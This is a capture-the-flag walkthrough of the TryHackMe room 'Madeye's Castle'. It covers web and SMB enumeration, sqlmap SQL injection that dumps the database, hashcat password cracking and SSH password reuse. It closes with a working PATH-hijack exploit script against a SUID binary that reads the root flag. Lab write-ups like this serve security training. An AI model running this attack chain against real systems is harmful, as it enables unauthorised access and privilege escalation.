---
title: "Madeye's Castle(THM)"
permalink: /writeups/madeyescastle
---

# <a href="https://tryhackme.com/room/madeyescastle" target="_blank">Madeye's Castle - THM</a>

## Tags
security, boot2root, web, sql

## Metadata

| Written | 11/07/2022
| Author | Thetvdh
| Platform | TryHackMe

## Tools used

- nmap
- ffuf
- vim
- sqlmap
- burpsuite
- foxyproxy
- smbclient
- smbmap
- NameThatHash (nth)
- cut
- sed
- ssh

### Note : For the purposes of this box the target IP was 10.10.199.116

# Enumeration

Let's start off with a nmap scan like usual

`nmap -A -o nmap.txt 10.10.199.116`

```
Nmap scan report for 10.10.94.43
Host is up (0.051s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-07-09T11:15:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2022-07-09T11:15:41+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

We have 4 ports open, 22 (SSH), 80 (HTTP), 139 and 445 (SMB). Let's start with the website.

# Port 80 (HTTP)

Opening the web page we are greeted with what appears to be a normal apache page but with an addition at the top. 

![Image of the default apache page with an addition at the top](/writeups/madeyescastle/apachepage.JPG "Apache Page")


This makes me think there may be something hidden in the source so I viewed the source and there was a comment

```html
  <!--
        TODO: Virtual hosting is good. 
        TODO: Register for hogwartz-castle.thm
  -->
```

This tells us that the site uses virtual hosting and appears to give us a hostname. Before going anywhere with this discovery though, lets try running a directory discovery scan to see if we find anything interesting

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.94.43/FUZZ`

```
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 41ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 41ms]
backup                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 32ms]
index.html              [Status: 200, Size: 10965, Words: 3517, Lines: 376, Duration: 31ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 33ms]
```

This shows us an interesting directory being **/backup**. Visiting this directory gives us a 403 forbidden however this just likely means it is just a directory on the server with no content. This means that running another scan on this directory may lead us to something we can access. So lets try it.

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.94.43/backup/FUZZ`

```
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 35ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
email                   [Status: 200, Size: 1527, Words: 236, Lines: 44, Duration: 34ms]
```

There we go! We have what appears to be an email backup. Lets have a look at it.

![Image showing the email backup as found on the webserver](/writeups/madeyescastle/email.JPG "Email Image")

Well that's slightly disappointing, I was hoping for more than just a reiteration that it is virtual hosting but let's have a look at that now.

So let us add the entry required to our hosts file

## Adding to hosts file

1. Make a copy of your current hosts file `cp /etc/hosts .`
2. Edit your hosts file as root using a program of your choice, i'm using vim `sudo vim /etc/hosts`
3. Add this line to the hosts file `<TARGET-IP> hogwartz-castle.thm`
4. Save and exit the file

Now we can visit hogwartz-castle.thm in the browser.

# Hogwartz-castle.thm Virtual Host Enumeration

Visiting the page gives us a login and nothing else (Bar a rather nice image of hogwarts). A quick check of the page source gives us nothing so lets run a ffuf scan.

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://hogwartz-castle.thm/FUZZ`

```
login                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 31ms]
logout                  [Status: 302, Size: 209, Words: 22, Lines: 4, Duration: 44ms]
server-status           [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 36ms]
static                  [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 30ms]
```

Nothing particularly interesting here, for the sake of completeness I ran a ffuf scan on the static files and nothing of interest was there so I won't include the results here.

We do still have a login page though so lets try some classics of login pages from the OWASP 10.

## Identification and Authentication Failures

I decided to chuck some default usernames and passwords at it such as 

- admin : password
- admin : admin
- admin - letmein
- admin - secure

None of these worked and I doubted that this would be the solution. Lets try another big one for login pages, injection.

## Injection

I doubted XSS would work but I tried anyway

Payload : `<script>alert(1)</script>`

This, unsuprisingly, didn't work. So let us try SQLi.

Wow! Putting a **'** in the username field throws a server error! This most likely means it is vulnerable to SQLi. Let us throw SQLMap at it and see what it can come up with.

### Using SQLMap (The easy way (in my opinion))

SQLMap has a wonderful feature that lets you import a web request into it, so I will be capturing the request using Burpsuite and then importing it into sqlmap.

1. Setup the burp proxy in foxyproxy (127.0.0.1 : 8080)
2. Capture a login attempt in burp, right click and click "Copy to file", save it as loginintercept.txt or similar
3. In a terminal run sqlmap, as this is a CTF i'm using some aggressive flags that you wouldn't necessarily use in a real life environment so bear that in mind.

The command I used was `sqlmap -r loginintercept.txt --level=5 --risk=3 --dump-all` and it didn't work.

After a bit of research and reading I added the --no-cast flag and that started working

`sqlmap -r loginintercept.txt --level=5 --risk=3 --dump-all --no-cast`

Unfortunately, this dump took ages but we got some useful information out of it. We got a user, a password hash, and this line of information is very interesting.

`[13:53:18] [INFO] retrieved: My linux username is my first name, and password uses best64`

After a google search I discovered that best64 is a hashcat rule set. This made me think that it is unlikely to use a wordlist such as rockyou.txt on this password as that would take far too long for a CTF. It was at this point I remembered that we have a SMB share avaiable to us so let's go and have a look at that and hopefully there will be a wordlist.

# Ports 139 and 445 (SMB)

First I ran SMBMap against the victim to get the shares quickly and easily

`smbmap -H 10.10.199.116 -u guest`

I use the username of "guest" as nmap told us that guest authentication was allowed
```
[+] Guest session   	IP: 10.10.199.116:445	Name: hogwartz-castle.thm                               
    Disk                                                Permissions	Comment
	----                                                -----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Harry's Important Files
	IPC$                                              	NO ACCESS	IPC Service (hogwartz-castle server (Samba, Ubuntu))
```

We have read only access to one of the shares so lets use smbclient to access that

`smbclient \\\\10.10.199.116\\sambashare -U guest`

Running `ls` gives us the following listing

```
  .                                   D        0  Wed Nov 25 20:19:20 2020
  ..                                  D        0  Wed Nov 25 19:57:55 2020
  spellnames.txt                      N      874  Wed Nov 25 20:06:32 2020
  .notes.txt                          H      147  Wed Nov 25 20:19:19 2020
```

These look important so I download them to my machine by using the `get` command

`get spellnames.txt`
`get .notes.txt`

Notes.txt contains some interesting text
```
cat notes.txt
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

The contents of spellnames.txt is a list of spells from Harry Potter, here is the wordlist I am after.

The comment on Hermonine liking historical text editors makes me think it could have something to do with the privesc vector but we shall see once we have cracked this password.

## Password Cracking

Using NameThatHash lets see what the hash most likely is and find out what setting on hashcat we need to use

`echo "passwordhash" > hash.txt`
`nth --file hash.txt`

The hash appears to be a SHA-512 Hash meaning we need to use hashcat 1700.

`hashcat -a 0 -m 1700 hash.txt spellnames.txt -r /usr/share/hashcat/rules/best64.rule`

We know which rule to use as it was mentioned in the SQLMap dump from earlier.

```
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Sat Jul  9 08:37:03 2022 (0 secs)
Time.Estimated...: Sat Jul  9 08:37:03 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Documents/Madeyecastle/spellnames.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1395.3 kH/s (0.73ms) @ Accel:256 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6237/6237 (100.00%)
Rejected.........: 0/6237 (0.00%)
Restore.Point....: 0/81 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: avadakedavra -> aentia
Hardware.Mon.#1..: Util: 24%

Started: Sat Jul  9 08:36:35 2022
Stopped: Sat Jul  9 08:37:05 2022
```

There we go! We have a password lets try logging into the website we found earlier.

## Back to the website

Logging in with the username and password combo we have got gave us this page (screenshot slightly edited to make it spoiler free)

![Image showing the page after logging in with the discovered creds](/writeups/madeyescastle/afterlogin.JPG)

It says that they don't care about password reuse. This is a massive hint that the password for this site will be used in other places. We know that Port 22 (SSH) is open so lets try and SSH into his account.

`ssh <redacted>@10.10.94.43`

Using the same username and password combination allows us to ssh into the box. As they say in the films "We're in!"

# Privesc and flag hunting

#### Note: From this point onwards I will be assuming you have also managed to SSH into the machine and will no longer be censoring usernames. Passwords and flags will remain censored.

Running `ls -la` gives the following output and shows us user1.txt
```
 4 harry harry 4096 Nov 26  2020 .
drwxr-xr-x 4 root  root  4096 Nov 26  2020 ..
lrwxrwxrwx 1 root  root     9 Nov 26  2020 .bash_history -> /dev/null
-rw-r----- 1 harry harry  220 Apr  4  2018 .bash_logout
-rw-r----- 1 harry harry 3771 Apr  4  2018 .bashrc
drwx------ 2 harry harry 4096 Nov 26  2020 .cache
drwx------ 3 harry harry 4096 Nov 26  2020 .gnupg
-rw-r----- 1 harry harry  807 Apr  4  2018 .profile
-rw-r----- 1 harry harry   40 Nov 26  2020 user1.txt
```

Let us start our privilege escalation enumeration.

First thing I always do is run `sudo -l` if I know the password, and we do so lets run that.

```
sudo -l
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```
Me being young menas I had no clue what pico was but a bit of research told me that Pico is Nanos predecessor. That is where the line of herminone liking old text editors comes in. This means we can run pico as hermonine so let us do that.

`sudo -u hermonine /usr/bin/pico`

Pico opens but I get a error message
```
Unable to create directory /home/harry/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
```
This is a good error as it is saying that I am unable to write to Harry's home directory, meaning that pico is running as hermonine as it should be.

We are told that the next flag is called user2.txt so using pico we can read that, assuming it is in Hermonine's home directory.

`sudo -u hermonine /usr/bin/pico /home/hermonine/user2.txt`

This gives us flag number 2

Just incase I decided to check if I could get the root flag this way

`sudo -u hermonine /usr/bin/pico /root/root.txt`

Unfortunately it didn't work. We need to privesc

Next thing I check for in a privesc is SUID bits using the `find` command

`find / -perm -u=s -type f 2>/dev/null`

```
/srv/time-turner/swagger
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/fusermount
/bin/su
/bin/ping
/bin/mount
```
Now then... /srv/time-turner/swagger is definitely not a standard SUID binary. Let's go and have a look at it.

`cd /srv/time-turner`
`ls -la`

Ok we have a binary here, owned by root with the SUID bit set. This is almost certainly our vector. Let's run it!

Running it asks for you to guess their number. After inevitably getting it wrong it tells you the correct number, that could be useful.

After quickly checking in vim to make sure it wasn't a bash script disguised as a binary I decided to run strings on it. Luckily the box author was very nice and installed strings on the box so you don't have to download it.

`strings swagger`

Reading the output most likely shows that the binary is written in C.

Too me these were the most interesting lines:
```
Nice use of the time-turner!
This system architecture is 
uname -p
Guess my number: 
Nope, that is not what I was thinking
I was thinking of %d
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```
Now this confirms my suspicion that it is written in C. It also calls uname -p which is very important as it doesn't give a absolute path. This means it is vulnerable to a PATH exploit. However to get to this bit we need to guess the number. Luckily this is written in C and another part of the strings gives us the answer to this problem.

```
rand
setregid
__isoc99_scanf
puts
time
setreuid
```

This program is using srand() and using time as a seed

This is not particularly secure as if you run the program again quickly enough it will generate the same number twice in a row.7

As the program tells us what the number is, with a bit of text manipulation we can run it.

After a long amount of time testing I finally came up with this

`echo 50 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger`

#### Breakdown of this command

1. First the binary is ran by piping 50 into it, doesn't matter really what number goes here.
2. The output of the binary running is fed into sed, a powerful text manipulation tool
    - -n supresses the text going to stdout
    - 2p only gives the second line of the output, in this case the line with the number on it
3. This line is then passed to cut which is also used to manipulate text
    - -d ' ' sets the delimiter to a space which cuts it up into sections
    - -f 5 selects the 5th of these sections which is just the number
4. This number is then piped back into the program

Running the whole command gives this
```
harry@hogwartz-castle:/srv/time-turner$ echo 50 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

This part of the exploit works!

Now we need to manipulate the PATH

## Path Manipulation

We could go all out and get a root shell but we don't really need to for this CTF, we know where the flag is we will just cat it out.

We will be using the /tmp directory as it is writable.

1. mkdir /tmp/bin
2. echo "cat /root/root.txt" > /tmp/bin/uname
3. chmod +x /tmp/bin/uname
4. export PATH="/tmp/bin/uname:$PATH"

Now running the command should give us the root flag

`echo 50 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger`

and it didn't work.

After being confused for ages it turns out putting /tmp in the path doens't work. Still not sure why so if someone could Tweet me [@Thetvdh1](https://twitter.com/Thetvdh1) (shameless plug) and explain why that would be great.

To get it to work I repeated the same steps as above but using Harry's home directory and it worked.

This is a short shell script that will do everything for you

```sh
#!/bin/sh
# exploit.sh
mkdir /home/harry/bin
echo "cat /root/root.txt" > /home/harry/bin/uname
chmod +x /home/harry/bin/uname
export PATH="/home/harry/bin:$PATH"
echo 50 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger
```

Running this will give you the root flag!

# Conclusion

I did this box a while ago and had been meaning to write it up but never got round to it. I really enjoyed doing this box and going back over it while writing it up to remind myself of some parts I didn't note down very well was also fun. The vector to get the root flag is very unique and probably took me about an hour to work out when I did it originally. I have never used tools such as sed or cut before so they are good tools to have in the toolkit.

I particularly enjoyed how well the box interlinked with itself, if I did it again with no knowledge of the box and all the knowledge I have now I probably would have enumerated the smb shares first as I would have definitely been less confused when I got the password hash. Before this box I had never really encountered virtual hosting so researching how to change the hosts file was all good experience.

Overall, I would definitely agree that this box is of medium difficulty. It still doesn't touch the skin of some of the HackTheBox boxes but it is fairly tricky for a TryHackMe box. I would highly recommend to anyone who is of reasonable experience and wants to brush up some skills or potentially use new tools.

That concludes my second writeup, hopefully soon I will have written enough so I can stop putting which number it is at the end but that is something for future me to do. Thank you for reading and I hope this writeup has been helpful!